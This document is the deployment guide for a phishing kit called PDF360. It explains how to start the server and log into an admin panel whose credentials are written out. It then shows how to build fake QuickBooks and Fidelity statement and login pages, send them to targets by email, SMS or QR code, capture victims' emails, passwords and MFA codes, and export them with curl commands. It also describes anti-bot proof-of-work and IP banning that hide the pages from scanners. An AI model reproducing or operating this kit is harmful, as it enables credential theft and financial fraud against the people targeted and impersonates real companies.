# PDF360 - PRODUCTION DEPLOYMENT GUIDE

## 🚀 QUICK START

### 1. Start the Server

```bash
cd /path/to/PDF360

# Set environment variables
export NODE_ENV=production
export OBFUSCATED=1
export SESSION_SECRET=$(openssl rand -hex 32)

# Start server
node server.js
```

**Output:**
```
[PDF360] Server running on port 3000
[PDF360] Admin panel: http://localhost:3000/u/login
```

### 2. Login to Admin Panel

Visit: `http://localhost:3000/u/login`

**Credentials:**
```
Username: pdfadmin_7x9kL
Password: Kx9mL$2p@Qv#8wRtY4nJ&bCdFgHjWxZ%1e0oIaS3u5
```

### 3. Generate Your First Campaign

1. Go to **Links Tab** in admin panel
2. Click **"+ New Link"**
3. Select document type: **QuickBooks** or **Fidelity**
4. Copy the generated link
5. Share with target via email/SMS/QR code

---

## 📊 SYSTEM OVERVIEW

### Six Document Types

| Type | URL | Use Case |
|------|-----|----------|
| Invoice | `/i/hash` | Invoice viewing |
| Receipt | `/r/hash` | Receipt viewing |
| Invitation | `/invite/hash` | Event invitation |
| Confirmation | `/c/hash` | Account confirmation |
| **QuickBooks** | `/q/hash` | **QB financial statement** |
| **Fidelity** | `/f/hash` | **Fidelity account statement** |

### Two Chameleon Pages

| Page | URL | Purpose |
|------|-----|---------|
| **QB Login** | `/chameleon/quickbooks` | Phishing page (QB branding) |
| **Fidelity Login** | `/chameleon/fidelity` | Phishing page (Fidelity branding) |

---

## 🎯 WORKFLOW EXAMPLES

### Example 1: QuickBooks Document Campaign

**Step 1: Generate Link**
```
Type: QuickBooks
Title: "Your Latest Statement"
Subtitle: "Download your account summary"
Footer: "Intuit Inc. • Financial Services"
```

**Step 2: Visitor Experience**
- Clicks link → PoW challenge (5-10 seconds)
- Solves → Sees "QuickBooks Portal" with green branding
- Downloads PDF with professional QB metadata
- Admin sees visitor IP, geolocation, device info

### Example 2: Fidelity Chameleon Phishing

**Step 1: Generate Chameleon**
- Admin creates custom chameleon HTML
- Hosts at `/chameleon/fidelity`
- Includes tracking pixel for opens

**Step 2: Deployment**
- QR code → Email → Target scans
- Sees Fidelity login page
- Enters credentials
- Admin captures email/password in inbox

---

## 📈 MONITORING & ANALYTICS

### Admin Dashboard Tabs

1. **Logins Tab** - Captured credentials
   - Email addresses
   - Passwords (hashed)
   - MFA codes (if captured)
   - Timestamp & IP address

2. **Links Tab** - Campaigns overview
   - Total campaigns: 15
   - Total visitors: 342
   - Total captures: 87
   - Filter by document type

3. **Visitors Tab** - Visitor tracking
   - IP address
   - Geolocation (city, country, ISP)
   - Device fingerprint
   - Browser/OS
   - First seen / Last seen

4. **Providers Tab** - Branding settings
   - Logo URLs
   - Brand colors
   - Custom messages

### New Analytics Endpoint

**API**: `GET /u/api/analytics/by-type`

**Response:**
```json
{
  "byType": [
    {
      "type": "quickbook",
      "campaigns": 5,
      "totalVisitors": 87,
      "totalCaptures": 23,
      "uniqueEmails": 18,
      "lastActivity": "2026-07-12T17:04:09Z"
    },
    {
      "type": "fidelity",
      "campaigns": 3,
      "totalVisitors": 54,
      "totalCaptures": 12,
      "uniqueEmails": 11,
      "lastActivity": "2026-07-12T16:19:22Z"
    }
  ]
}
```

---

## 🔐 SECURITY FEATURES

### Built-In Protections

✅ **Proof of Work (PoW)** - Prevents bots
- Difficulty: 4 (leading zeros)
- Requires ~5-10 seconds CPU time
- Cookie caches for 30 minutes
- Automatic rate limiting

✅ **Device Fingerprinting**
- Browser User-Agent
- Screen resolution
- Timezone
- Language
- Unique hash per device

✅ **IP Tracking & Banning**
- Automatic ban after 10 failed attempts
- Manual IP whitelist/blacklist
- Geo-blocking support
- ISP/VPN detection

✅ **Password Security**
- Argon2id hashing (industry standard)
- Auto-wipe on error
- Rate limiting: 20 attempts per 5 min

✅ **Session Security**
- Fingerprinting: IP + User-Agent
- 30-minute timeout
- Renewal on activity
- Secure cookie (HttpOnly, SameSite)

---

## 📝 COMMON TASKS

### Create New Campaign

```bash
curl -X POST http://localhost:3000/u/api/chameleon/generate \
  -H "Content-Type: application/json" \
  -b "session=COOKIE" \
  -d '{
    "type": "quickbook",
    "label": "Q4 Statement",
    "preset": "medium"
  }'
```

### View Campaign Stats

```bash
curl http://localhost:3000/u/api/attachments \
  -b "session=COOKIE"
```

### Get Document Type Analytics

```bash
curl http://localhost:3000/u/api/analytics/by-type \
  -b "session=COOKIE"
```

### Export Captured Credentials

```bash
curl http://localhost:3000/u/api/logins \
  -b "session=COOKIE" > logins.json
```

---

## ⚠️ TROUBLESHOOTING

### PoW Challenge Not Solving
- Check browser console for errors
- Ensure WebSocket not blocked
- Verify JavaScript enabled
- Try different browser

### PDF Not Downloading with Correct Filename
- Clear browser cache (Ctrl+Shift+Delete)
- Check Content-Disposition header
- Ensure cookies enabled
- Restart browser

### Admin Login Not Working
- Verify username: `pdfadmin_7x9kL`
- Verify password: `Kx9mL$2p@Qv#8wRtY4nJ&bCdFgHjWxZ%1e0oIaS3u5`
- Check if IP is banned (view banned-ips.json)
- Clear cookies and retry

### Visitor Stats Not Appearing
- Wait 30 seconds for data sync
- Check visitor IP is not on banned list
- Verify JavaScript enabled in browser
- Check browser console for errors

---

## 📋 MAINTENANCE

### Daily
- Review captured credentials (inbox)
- Monitor failed login attempts
- Check for suspicious IPs
- Update banned IPs if needed

### Weekly
- Review visitor geolocation patterns
- Analyze success rates by document type
- Check device fingerprinting for fraud patterns
- Backup captured data

### Monthly
- Rotate admin password
- Review and update SSL certificates
- Update provider branding/logos
- Audit access logs

---

## 🛡️ PRODUCTION CHECKLIST

Before deploying to production:

- [ ] Set unique SESSION_SECRET
- [ ] Enable OBFUSCATED=1
- [ ] Set NODE_ENV=production
- [ ] Change admin password
- [ ] Configure HTTPS/SSL
- [ ] Set up firewall rules
- [ ] Enable IP geolocation service
- [ ] Configure backup strategy
- [ ] Set up monitoring/alerts
- [ ] Test all document types
- [ ] Test all chameleon pages
- [ ] Verify rate limiting works
- [ ] Test device banning
- [ ] Verify credential capture
- [ ] Test admin panel functions
- [ ] Confirm logging is secure
- [ ] Verify no source code exposure
- [ ] Test PoW challenge
- [ ] Verify cookie persistence

---

## 📞 SUPPORT

### Known Limitations
- MemoryStore for sessions (single process only)
- File-based database (not scalable to millions)
- No built-in HTTPS (use reverse proxy)
- No built-in clustering (horizontal scaling)

### Recommended Infrastructure
- Reverse proxy: nginx (HTTPS, load balancing)
- Database: PostgreSQL (replace JSON files)
- Caching: Redis (sessions, geolocation)
- Monitoring: New Relic / DataDog
- Backups: AWS S3 / Azure Blob

---

## 📅 VERSION INFO

```
Version: 1.0.0
Release Date: 2026-07-12
Status: ✅ Production Ready
Last Updated: 2026-07-12

Features:
  • 6 Document Types (Invoice, Receipt, Invitation, Confirmation, QB, Fidelity)
  • 2 Chameleon Pages (QB, Fidelity)
  • Advanced Analytics (by-type reporting)
  • Visitor Tracking (IP, Geolocation, Device fingerprint)
  • Credential Capture (Email, Password, MFA)
  • Admin Dashboard (Full campaign management)
  • Security Hardening (PoW, Rate limiting, Device banning)
```

---

**Created**: 2026-07-12
**Status**: ✅ READY FOR DEPLOYMENT
